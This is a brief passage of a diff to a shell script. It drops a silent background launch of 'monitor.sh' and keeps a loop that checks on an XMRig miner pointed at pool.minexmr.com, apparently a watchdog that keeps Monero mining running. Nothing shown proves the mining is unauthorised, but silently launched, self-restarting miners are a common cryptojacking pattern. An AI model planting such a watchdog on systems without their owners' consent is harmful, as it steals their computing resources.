@@ -19,7 +19,8 @@ function CheckProcess()
         fi
 }
 
-./monitor.sh >/dev/null 2>&1 &  
+
+
 num=0
 while [ 1 ] ; do
     CheckProcess "./xmrig -o pool.minexmr.com:443"
